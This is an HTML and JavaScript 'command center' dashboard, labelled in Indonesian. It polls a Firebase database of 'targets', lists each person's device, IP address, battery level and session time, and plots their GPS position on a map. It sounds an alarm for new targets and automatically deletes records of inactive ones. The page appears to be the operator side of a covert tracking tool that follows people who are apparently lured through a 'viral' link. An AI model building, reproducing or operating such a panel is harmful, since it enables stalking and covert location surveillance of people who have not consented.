<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Real-Time Command Center v5.0</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #050505; color: #00ff41; padding: 20px; margin: 0; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
        .grid { display: grid; grid-template-columns: 1fr 400px; gap: 20px; }
        .card { background: #0f172a; border: 1px solid #334155; padding: 15px; border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; }
        th { color: #888; text-transform: uppercase; font-size: 11px; }
        .map-box { height: 400px; background: #000; border: 1px solid #00ff41; margin-top: 15px; }
        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); }
        .session-time { color: #fbbf24; font-weight: bold; }
        .status-active { color: #00ff41; font-weight: bold; }
        .status-cleaning { color: #ff4141; font-size: 10px; font-style: italic; }
    </style>
</head>
<body>

<div class="header">
    <h1>SATELLITE RADAR [AUTO-CLEAN MODE]</h1>
    <div id="stats">Target: 0</div>
</div>

<div class="grid">
    <div class="card">
        <h3>DAFTAR TARGET AKTIF</h3>
        <table>
            <thead>
                <tr>
                    <th>DEVICE</th>
                    <th>IP ADDRESS</th>
                    <th>BATTERY</th>
                    <th>DURASI SESI</th>
                    <th>AKSI</th>
                </tr>
            </thead>
            <tbody id="targetList"></tbody>
        </table>
    </div>

    <div class="card">
        <h3>VISUALISASI LOKASI</h3>
        <div id="detailInfo">Menunggu data...</div>
        <div class="map-box" id="mapBox"></div>
    </div>
</div>

<audio id="alarmSound" src="https://www.soundjay.com/buttons/beep-07a.mp3"></audio>

<script>
    const BASE_DB_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets";
    let knownTargets = new Set();

    function formatDuration(startTime) {
        const diff = Math.floor((Date.now() - startTime) / 1000);
        const h = Math.floor(diff / 3600);
        const m = Math.floor((diff % 3600) / 60);
        const s = diff % 60;
        return `${h}j ${m}m ${s}d`;
    }

    // FUNGSI PEMBERSIH OTOMATIS
    async function cleanInactiveTargets(id, lastUpdate) {
        const now = Date.now();
        const inactiveTime = (now - lastUpdate) / 1000; // dalam detik

        if (inactiveTime > 60) { // JIKA TIDAK AKTIF LEBIH DARI 60 DETIK
            console.log(`Membersihkan target: ${id}`);
            await fetch(`${BASE_DB_URL}/${id}.json`, { method: 'DELETE' });
            knownTargets.delete(id);
            return true;
        }
        return false;
    }

    function updateDashboard() {
        fetch(`${BASE_DB_URL}.json`)
        .then(res => res.json())
        .then(async (data) => {
            const tbody = document.getElementById('targetList');
            if (!data) { 
                tbody.innerHTML = "<tr><td colspan='5'>Tidak ada target aktif.</td></tr>"; 
                document.getElementById('stats').innerText = "Target: 0";
                return; 
            }

            let currentHTML = "";
            let count = 0;

            for (let id in data) {
                const t = data[id];
                
                // Cek apakah perlu dibersihkan
                const isDeleted = await cleanInactiveTargets(id, t.updated_at);
                if (isDeleted) continue; 

                count++;
                if (!knownTargets.has(id)) {
                    document.getElementById('alarmSound').play().catch(()=>{});
                    knownTargets.add(id);
                }

                currentHTML += `
                    <tr>
                        <td>${t.device}</td>
                        <td>${t.ip}</td>
                        <td>${t.battery}</td>
                        <td class="session-time">${formatDuration(t.start_time)}</td>
                        <td><button onclick="showMap(${t.lat}, ${t.lon})" style="background:#00ff41; border:none; padding:5px 10px; cursor:pointer;">TRACK</button></td>
                    </tr>
                `;
            }
            tbody.innerHTML = currentHTML;
            document.getElementById('stats').innerText = `Target: ${count}`;
        });
    }

    function showMap(lat, lon) {
        const mapURL = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=16&ie=UTF8&iwloc=&output=embed`;
        document.getElementById('mapBox').innerHTML = `<iframe src="${mapURL}"></iframe>`;
    }

    setInterval(updateDashboard, 2000);
    window.onload = updateDashboard;
</script>
</body>
</html>
